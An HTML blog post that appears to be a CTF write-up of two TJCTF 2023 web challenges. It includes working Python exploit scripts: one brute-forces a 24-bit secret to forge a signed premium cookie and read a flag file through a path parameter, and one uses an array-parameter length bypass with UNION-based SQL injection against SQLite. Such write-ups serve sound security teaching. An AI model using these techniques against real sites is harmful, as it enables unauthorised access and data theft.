<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="TJCTF 2023 - Writeup" /><meta name="author" content="H0j3n" /><meta property="og:locale" content="en" /><meta name="description" content="Welcome to my blog, where I will share a write-up on the web challenges. I am a member of Team M53 from Malaysia, and we participated in the TJCTF 2023 competition this year." /><meta property="og:description" content="Welcome to my blog, where I will share a write-up on the web challenges. I am a member of Team M53 from Malaysia, and we participated in the TJCTF 2023 competition this year." /><link rel="canonical" href="https://h0j3n.github.io/posts/TJCTF-2023-Writeup/" /><meta property="og:url" content="https://h0j3n.github.io/posts/TJCTF-2023-Writeup/" /><meta property="og:site_name" content="$(H0j3n)" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-05-27T08:00:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="TJCTF 2023 - Writeup" /><meta name="twitter:site" content="@H0j3n" /><meta name="twitter:creator" content="@H0j3n" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"H0j3n"},"dateModified":"2023-05-28T08:07:19+08:00","datePublished":"2023-05-27T08:00:00+08:00","description":"Welcome to my blog, where I will share a write-up on the web challenges. I am a member of Team M53 from Malaysia, and we participated in the TJCTF 2023 competition this year.","headline":"TJCTF 2023 - Writeup","mainEntityOfPage":{"@type":"WebPage","@id":"https://h0j3n.github.io/posts/TJCTF-2023-Writeup/"},"url":"https://h0j3n.github.io/posts/TJCTF-2023-Writeup/"}</script><title>TJCTF 2023 - Writeup | $(H0j3n)</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="$(H0j3n)"><meta name="application-name" content="$(H0j3n)"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="https://avatars.githubusercontent.com/u/51261763?v=4" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">$(H0j3n)</a></div><div class="site-subtitle font-italic">Knowledge sharing related to Cybersecurity</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/H0j3n" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/H0j3n" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>TJCTF 2023 - Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>TJCTF 2023 - Writeup</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1685145600" data-df="ll" data-toggle="tooltip" data-placement="bottom"> May 27, 2023 </em> </span> <span> Updated <em class="" data-ts="1685232439" data-df="ll" data-toggle="tooltip" data-placement="bottom"> May 28, 2023 </em> </span><div class="d-flex justify-content-between"> <span> By <em> H0j3n </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1953 words"> <em>10 min</em> read</span></div></div></div><div class="post-content"><p>Welcome to my blog, where I will share a write-up on the web challenges. I am a member of Team M53 from Malaysia, and we participated in the TJCTF 2023 competition this year.</p><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/8_tjctf2023/tjctf_7.png" alt="" data-proofer-ignore></p><p>Link to archive challenges: <a href="https://github.com/sajjadium/ctf-archives/tree/main/ctfs/TJCTF/2023">https://github.com/sajjadium/ctf-archives/tree/main/ctfs/TJCTF/2023</a></p><h3 id="category--web"><span class="mr-2">Category : Web</span><a href="#category--web" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="web--pay-to-win"><span class="mr-2">Web : pay-to-win</span><a href="#web--pay-to-win" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><blockquote><p>This service is wayyyyy to expensive. I can’t afford that! I did hear that premium users get a flag though…</p></blockquote><p><strong>Source Code (server.zip)</strong> : <a href="https://github.com/sajjadium/ctf-archives/tree/main/ctfs/TJCTF/2023/web/pay-to-win">server.zip</a></p><p>Looking at the <code class="language-plaintext highlighter-rouge">Dockerfile</code>, the flag is located in <code class="language-plaintext highlighter-rouge">/secret-flag-dir/flag.txt</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>RUN mkdir /secret-flag-dir; mv /app/flag.txt /secret-flag-dir/flag.txt
</pre></table></code></div></div><p>The code provided represents a Flask application with three endpoints.</p><blockquote class="prompt-info"><div><p><code class="language-plaintext highlighter-rouge">/ (GET)</code>: This is the root endpoint of the application</p></div></blockquote><blockquote class="prompt-info"><div><p><code class="language-plaintext highlighter-rouge">/login (GET)</code>: This endpoint is used to display the login page</p></div></blockquote><blockquote class="prompt-info"><div><p><code class="language-plaintext highlighter-rouge">/login (POST)</code>: This endpoint is used for user login</p></div></blockquote><p>When a random username, such as <code class="language-plaintext highlighter-rouge">test</code>, is entered on the web page, it will redirect to another page. The web page mentioned that the current user is not a premium user.</p><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/8_tjctf2023/tjctf_1.png" alt="" data-proofer-ignore></p><p>Inside <code class="language-plaintext highlighter-rouge">app.py</code>, it can be observed that by default, all new users will have their <code class="language-plaintext highlighter-rouge">user_type</code> set to <code class="language-plaintext highlighter-rouge">basic</code></p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
	<span class="s">"username"</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
	<span class="s">"user_type"</span><span class="p">:</span> <span class="s">"basic"</span>
<span class="p">}</span>
</pre></table></code></div></div><p>If we can find a way to modify the <code class="language-plaintext highlighter-rouge">user_type</code> to <code class="language-plaintext highlighter-rouge">premium</code>, it may grant us access to a different page, potentially enabling us to read the flag.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="k">if</span> <span class="n">payload</span><span class="p">[</span><span class="s">'user_type'</span><span class="p">]</span> <span class="o">==</span> <span class="s">'premium'</span><span class="p">:</span>
	<span class="n">theme_name</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'theme'</span><span class="p">)</span> <span class="ow">or</span> <span class="s">'static/premium.css'</span>
	<span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'premium.jinja'</span><span class="p">,</span> <span class="n">theme_to_use</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="n">theme_name</span><span class="p">).</span><span class="n">read</span><span class="p">())</span>
<span class="k">else</span><span class="p">:</span>
	<span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'basic.jinja'</span><span class="p">)</span>
</pre></table></code></div></div><p>Every new user will have a randomly generated hexadecimal value associated with their username using the following code snippet</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="k">if</span> <span class="n">username</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">users</span><span class="p">:</span>
        <span class="n">users</span><span class="p">[</span><span class="n">username</span><span class="p">]</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="n">getrandbits</span><span class="p">(</span><span class="mi">24</span><span class="p">))[</span><span class="mi">2</span><span class="p">:]</span>
</pre></table></code></div></div><p>The randomly generated value, which we are unaware of, is then used to create a hash that ensures the data cannot be easily altered</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">hash</span><span class="p">(</span><span class="n">data</span> <span class="o">+</span> <span class="n">users</span><span class="p">[</span><span class="n">payload</span><span class="p">[</span><span class="s">'username'</span><span class="p">]])</span>
</pre></table></code></div></div><p>During the CTF, I attempted to brute force the known hash we obtained in the response. The solution script can be found below.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64encode</span>
<span class="kn">import</span> <span class="nn">hashlib</span><span class="p">,</span><span class="n">json</span><span class="p">,</span><span class="n">random</span><span class="p">,</span><span class="n">requests</span>

<span class="k">def</span> <span class="nf">hash</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">sha256</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="s">'utf-8'</span><span class="p">)).</span><span class="n">hexdigest</span><span class="p">()</span>

<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">"username"</span><span class="p">:</span> <span class="s">""</span><span class="p">,</span>
    <span class="s">"user_type"</span><span class="p">:</span> <span class="s">"basic"</span>
<span class="p">}</span>

<span class="n">found_hash</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">b64data</span> <span class="o">=</span> <span class="n">b64encode</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>

<span class="k">while</span> <span class="s">"73553a6d471a7fea554237c8aafa72327a4b29446d59be71a9ef1c4d5a7d908e"</span> <span class="o">!=</span> <span class="n">found_hash</span><span class="p">:</span>
        <span class="n">found_users</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="n">getrandbits</span><span class="p">(</span><span class="mi">24</span><span class="p">))[</span><span class="mi">2</span><span class="p">:]</span>
        <span class="n">found_hash</span> <span class="o">=</span> <span class="nb">hash</span><span class="p">(</span><span class="n">b64data</span><span class="p">.</span><span class="n">decode</span><span class="p">()</span> <span class="o">+</span> <span class="n">found_users</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="s">"[+] Found!"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"[+] Craft Payload (premium)"</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">"username"</span><span class="p">:</span> <span class="s">""</span><span class="p">,</span>
    <span class="s">"user_type"</span><span class="p">:</span> <span class="s">"premium"</span>
<span class="p">}</span>
<span class="n">b64data</span> <span class="o">=</span> <span class="n">b64encode</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
<span class="n">data_hash</span> <span class="o">=</span> <span class="nb">hash</span><span class="p">(</span><span class="n">b64data</span><span class="p">.</span><span class="n">decode</span><span class="p">()</span> <span class="o">+</span> <span class="n">found_users</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"data = "</span><span class="o">+</span><span class="n">b64data</span><span class="p">.</span><span class="n">decode</span><span class="p">())</span>
<span class="k">print</span><span class="p">(</span><span class="s">"hash = "</span><span class="o">+</span><span class="n">data_hash</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"[+] Get the flag!"</span><span class="p">)</span>
<span class="n">cookies</span><span class="o">=</span><span class="p">{</span>
        <span class="s">"data"</span><span class="p">:</span><span class="n">b64data</span><span class="p">.</span><span class="n">decode</span><span class="p">(),</span>
        <span class="s">"hash"</span><span class="p">:</span><span class="n">data_hash</span>
<span class="p">}</span>
<span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"https://pay-to-win.tjc.tf/?theme=/secret-flag-dir/flag.txt"</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="n">split</span><span class="p">():</span>
        <span class="k">if</span> <span class="s">"tjctf"</span> <span class="ow">in</span> <span class="n">i</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
                <span class="k">break</span>
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/8_tjctf2023/tjctf_2.png" alt="" data-proofer-ignore></p><h4 id="web--ez-sql"><span class="mr-2">Web : ez-sql</span><a href="#web--ez-sql" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><blockquote><p>just your average sql challenge, nothing else to see here (trust)</p></blockquote><p><strong>Source Code (app.js)</strong> : <a href="https://github.com/sajjadium/ctf-archives/blob/main/ctfs/TJCTF/2023/web/ez-sql/app.js">app.js</a></p><p>It is quite evident that this challenge involves SQL injection in the <code class="language-plaintext highlighter-rouge">search</code> endpoint.</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="nx">app</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/search</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="p">{</span> <span class="nx">name</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">name</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">send</span><span class="p">({</span> <span class="na">err</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Bad request</span><span class="dl">'</span> <span class="p">});</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="nx">name</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">6</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">send</span><span class="p">({</span> <span class="na">err</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Bad request</span><span class="dl">'</span> <span class="p">});</span>
    <span class="p">}</span>

    <span class="nx">db</span><span class="p">.</span><span class="nx">all</span><span class="p">(</span><span class="s2">`SELECT * FROM jokes WHERE joke LIKE '%</span><span class="p">${</span><span class="nx">name</span><span class="p">}</span><span class="s2">%'`</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">rows</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">err</span><span class="p">.</span><span class="nx">message</span><span class="p">);</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">Internal server error</span><span class="dl">'</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">rows</span><span class="p">);</span>
    <span class="p">});</span>
<span class="p">});</span>
</pre></table></code></div></div><p>The flag is stored in a table that starts with <code class="language-plaintext highlighter-rouge">flag_</code>, and within that table, there is a column named <code class="language-plaintext highlighter-rouge">flag</code> which contains the flag we want to read.</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">flag</span> <span class="o">=</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="dl">'</span><span class="s1">./flag.txt</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span> <span class="na">encoding</span><span class="p">:</span> <span class="dl">'</span><span class="s1">utf8</span><span class="dl">'</span> <span class="p">}).</span><span class="nx">trim</span><span class="p">();</span>
<span class="kd">const</span> <span class="nx">flagTable</span> <span class="o">=</span> <span class="s2">`flag_</span><span class="p">${</span><span class="nx">uuid</span><span class="p">.</span><span class="nx">v4</span><span class="p">().</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/-/g</span><span class="p">,</span> <span class="dl">'</span><span class="s1">_</span><span class="dl">'</span><span class="p">)}</span><span class="s2">`</span><span class="p">;</span>
<span class="nx">db</span><span class="p">.</span><span class="nx">run</span><span class="p">(</span><span class="s2">`INSERT INTO </span><span class="p">${</span><span class="nx">flagTable</span><span class="p">}</span><span class="s2"> (flag) VALUES ('</span><span class="p">${</span><span class="nx">flag</span><span class="p">}</span><span class="s2">')`</span><span class="p">);</span>
</pre></table></code></div></div><p>Upon reviewing the <code class="language-plaintext highlighter-rouge">search</code> function again, it appears that the <strong>SELECT</strong> statement is vulnerable to SQL injection in the <strong>LIKE</strong> clause. By using the input <code class="language-plaintext highlighter-rouge">%'--</code>, we can exploit this vulnerability and retrieve all the data. We can easily craft a payload to retrieve the flag; however, there is a constraint that prevents us from doing so. The input we provide cannot exceed 6 characters, as any input longer than 6 characters will result in a <code class="language-plaintext highlighter-rouge">Bad Request response</code></p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="dl">"</span><span class="s2">err</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">Bad request</span><span class="dl">"</span><span class="p">}</span>
</pre></table></code></div></div><p>I would like to acknowledge and thank my team member, <a href="https://hong5489.github.io/whoami/">@Stephen</a>, for discovering a method to bypass the length constraint. By utilizing <code class="language-plaintext highlighter-rouge">[]</code> in the parameter, it transforms the input into an array format, effectively circumventing the length limitation. The solution script can be found below.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">urllib3</span>
<span class="n">urllib3</span><span class="p">.</span><span class="n">disable_warnings</span><span class="p">()</span>

<span class="c1"># (1)
</span><span class="n">payload</span> <span class="o">=</span> <span class="s">"nothinghere' UNION SELECT 1,tbl_name from sqlite_master where type='table' and tbl_name like 'flag_%'--"</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s">"https://ez-sql-bc4100ee1e8b238e.tjc.tf/search?name[]=</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s">"</span><span class="p">,</span>  <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
<span class="n">flag_tbl</span> <span class="o">=</span> <span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'[{"id":1,"joke":"'</span><span class="p">,</span><span class="s">''</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">'"}]'</span><span class="p">,</span><span class="s">''</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Table name: </span><span class="si">{</span><span class="n">flag_tbl</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

<span class="c1"># (2)
</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"nothinghere' UNION SELECT 1,flag from </span><span class="si">{</span><span class="n">flag_tbl</span><span class="si">}</span><span class="s">--"</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s">"https://ez-sql-bc4100ee1e8b238e.tjc.tf/search?name[]=</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s">"</span><span class="p">,</span>  <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
<span class="n">flags</span> <span class="o">=</span> <span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'[{"id":1,"joke":"'</span><span class="p">,</span><span class="s">''</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">'"}]'</span><span class="p">,</span><span class="s">''</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Flag = </span><span class="si">{</span><span class="n">flags</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
